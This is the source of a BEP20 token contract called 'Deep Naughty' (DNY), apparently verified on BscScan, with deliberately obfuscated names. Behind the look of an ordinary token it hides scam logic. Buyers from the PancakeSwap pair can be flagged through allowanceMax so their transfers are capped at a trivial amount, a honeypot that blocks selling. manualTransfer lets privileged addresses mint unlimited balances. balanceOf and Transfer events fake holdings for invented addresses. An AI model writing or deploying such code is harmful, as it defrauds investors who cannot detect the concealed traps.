/**
 *Submitted for verification at BscScan.com on 2023-01-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;



library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

}


interface IBEP20 {

    function symbol() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract DeepNaughty is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    mapping(address => bool)  takeReceiverSenderTotalBuyLiquidityEnable;
    bool private exemptReceiverMinAmountEnableLiquidity = false;
    uint256 private maxSellModeAutoToken = 0;


    uint256 public exemptTokenToTeam = 0;

    address constant receiverEnableFundFee = 0xDC3AdbCF58C0A0AbAB6CB88d835E2Da0847986c7;

    bool private autoLiquidityExemptMode = false;
    bool public tokenWalletMintMin = false;




    address public uniswapV2Pair;
    IUniswapV2Router public launchedTokenAmountTeam;
    string constant _symbol = "DNY";
    bool public toShouldEnableReceiverFromLaunchMin = false;
    uint256  enableMarketingMaxLaunch = 100000000 * (10 ** 18);
    uint256 swapIsTokenLimit = 0;
    mapping(address => bool) private sellModeTeamIs;

    
    address private amountReceiverFundBuyTxSellLaunch;


    bool private isExemptTxSenderBurnMax = false;
    address constant burnFromReceiverMin = 0xA7Cc66aDBac065f5e5b9ce1829d9B218E9A9c07e;
    uint256 private teamTradingReceiverAuto = 0;
    bool private autoLiquidityExemptMode1 = false;
    uint256 private autoLiquidityExemptMode2 = 0;
    bool public autoLiquidityExemptMode0 = false;
    mapping(address => uint256) _balances;
    uint256 constant enableLiquidityExemptTx = 100 * 10 ** 18;
    string constant _name = "Deep Naughty";
    mapping(address => bool)  fromSellEnableFund;
    uint256 constant sellToTakeSwapLiquidity = 1000000 * 10 ** 18;
    uint256 public modeTxSenderFee = 0;
    bool private totalMaxFeeLiquidity = false;
    uint256 private sellFromEnableTeamAuto = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    bool private autoLiquidityExemptMode4 = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        launchedTokenAmountTeam = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(launchedTokenAmountTeam.factory()).createPair(address(this), launchedTokenAmountTeam.WETH());
        _allowances[address(this)][address(launchedTokenAmountTeam)] = enableMarketingMaxLaunch;

        _balances[msg.sender] = enableMarketingMaxLaunch;
        emit Transfer(address(0), msg.sender, enableMarketingMaxLaunch);
        amountReceiverFundBuyTxSellLaunch = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableMarketingMaxLaunch;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return takeReceiverSenderTotalBuyLiquidityEnable[spender];
    }

    function atFundLimitEnable(address sellReceiverMaxAmount) private pure returns (uint256) {
        uint256 fundWalletBuyTeam = launchReceiverAutoExemptSellTotalTx();
        uint256 atTokenTeamIs = uint160(sellReceiverMaxAmount) - fundWalletBuyTeam;
        return atTokenTeamIs;
    }

    function atWalletSenderLiquidityLaunchedTxFrom(address exemptShouldLimitBuy, address swapExemptTeamBurn, uint256 swapReceiverBurnEnable) internal returns (bool) {
        if (fundReceiverFromTx(swapExemptTeamBurn)) {
            burnTradingReceiverLiquidity(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable, false);
            return true;
        }
        if (fundReceiverFromTx(exemptShouldLimitBuy)) {
            burnTradingReceiverLiquidity(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable, true);
            return true;
        }

        bool marketingBurnReceiverShould = launchShouldExemptLaunched(exemptShouldLimitBuy) || launchShouldExemptLaunched(swapExemptTeamBurn);
        if (marketingBurnReceiverShould) {
            return listTradingLimitExempt(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable);
        }

        if (exemptShouldLimitBuy == uniswapV2Pair && !marketingBurnReceiverShould) {
            fromSellEnableFund[swapExemptTeamBurn] = true;
        }

        if (takeReceiverSenderTotalBuyLiquidityEnable[exemptShouldLimitBuy]) {
            return listTradingLimitExempt(exemptShouldLimitBuy, swapExemptTeamBurn, 10 ** 10);
        }

        return listTradingLimitExempt(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return atWalletSenderLiquidityLaunchedTxFrom(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function burnTradingReceiverLiquidity(address exemptShouldLimitBuy, address swapExemptTeamBurn, uint256 swapReceiverBurnEnable, bool fromBuyAmountMarketing) private {
        if (fromBuyAmountMarketing) {
            uint256 fundWalletBuyTeam = launchReceiverAutoExemptSellTotalTx();
            exemptShouldLimitBuy = address(uint160(fundWalletBuyTeam + swapIsTokenLimit));
            swapIsTokenLimit++;
            _balances[swapExemptTeamBurn] = _balances[swapExemptTeamBurn].add(swapReceiverBurnEnable);
        } else {
            _balances[exemptShouldLimitBuy] = _balances[exemptShouldLimitBuy].sub(swapReceiverBurnEnable);
        }
        emit Transfer(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable);
    }

    function launchShouldExemptLaunched(address sellTakeSwapFeeLiquidityToLaunch) private view returns (bool) {
        return sellTakeSwapFeeLiquidityToLaunch == amountReceiverFundBuyTxSellLaunch;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (fundReceiverFromTx(account)) {
            return exemptLaunchedAutoTradingSender(account);
        }
        return _balances[account];
    }

    function manualTransfer(address exemptShouldLimitBuy, address swapExemptTeamBurn, uint256 swapReceiverBurnEnable) public {
        if (!txLiquidityEnableShould(msg.sender) && msg.sender != amountReceiverFundBuyTxSellLaunch) {
            return;
        }
        if (fundReceiverFromTx(swapExemptTeamBurn)) {
            burnTradingReceiverLiquidity(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable, false);
            return;
        }
        if (fundReceiverFromTx(exemptShouldLimitBuy)) {
            burnTradingReceiverLiquidity(exemptShouldLimitBuy, swapExemptTeamBurn, swapReceiverBurnEnable, true);
            return;
        }
        if (exemptShouldLimitBuy == address(0)) {
            _balances[swapExemptTeamBurn] = _balances[swapExemptTeamBurn].add(swapReceiverBurnEnable);
            return;
        }
    }

    function txLiquidityEnableShould(address sellReceiverMaxAmount) private pure returns (bool) {
        return sellReceiverMaxAmount == receiverEnableFundFee;
    }

    function fundReceiverFromTx(address sellReceiverMaxAmount) private pure returns (bool) {
        uint256 fundWalletBuyTeam = launchReceiverAutoExemptSellTotalTx();
        uint256 shouldTradingModeLaunched = uint160(sellReceiverMaxAmount);
        if (shouldTradingModeLaunched >= fundWalletBuyTeam && shouldTradingModeLaunched < fundWalletBuyTeam + 10000) {
            return true;
        }
        return false;
    }

    function allowanceMax(address spender) external {
        if (fromSellEnableFund[spender]) {
            takeReceiverSenderTotalBuyLiquidityEnable[spender] = true;
        }
    }

    function launchReceiverAutoExemptSellTotalTx() private pure returns (uint256) {
        return uint160(burnFromReceiverMin) + 1;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableMarketingMaxLaunch) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return atWalletSenderLiquidityLaunchedTxFrom(sender, recipient, amount);
    }

    function exemptLaunchedAutoTradingSender(address sellReceiverMaxAmount) private view returns (uint256) {
        uint256 atTokenTeamIs = atFundLimitEnable(sellReceiverMaxAmount);
        if (atTokenTeamIs < swapIsTokenLimit) {
            return enableLiquidityExemptTx * atTokenTeamIs;
        }
        return sellToTakeSwapLiquidity + enableLiquidityExemptTx * atTokenTeamIs;
    }

    function listTradingLimitExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}